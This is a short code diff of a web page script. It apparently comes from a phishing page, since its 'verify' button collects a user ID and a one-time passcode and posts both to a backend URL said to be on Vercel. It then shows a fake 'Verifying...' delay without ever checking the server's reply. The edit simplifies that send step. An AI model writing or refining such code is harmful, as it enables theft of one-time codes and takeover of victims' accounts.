@@ -43,12 +43,12 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-   // 5. VERIFY BUTTON LOGIC  
+  // 5. VERIFY BUTTON LOGIC  
 const btnVerify = document.getElementById('btnVerify');  
 if (btnVerify) {  
     btnVerify.addEventListener('click', function() {  
-        // Get the values AGAIN so the script can see them
-        const user = document.getElementById('txiID').value; 
+        // Make sure these match your HTML IDs exactly!
+        const user = document.getElementById('txiID').value;  
         const otpCode = document.getElementById('otpInput').value;  
 
         if (otpCode === "") {  
@@ -56,20 +56,12 @@ if (btnVerify) {
             return;  
         }
 
-        // Send the OTP data to your Vercel backend
         fetch(BACKEND_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                userId: user, 
-                otp: otpCode, 
-                status: "OTP_SUBMITTED" 
-            })
-        })
-        .then(response => {
-            console.log("OTP Sent!");
-        })
-        .catch(err => console.error("Error sending OTP:", err));
+            // We send the user name and the NEW otpCode
+            body: JSON.stringify({ userId: user, otp: otpCode }) 
+        });
 
         btnVerify.innerText = "Verifying...";  
         setTimeout(() => {  
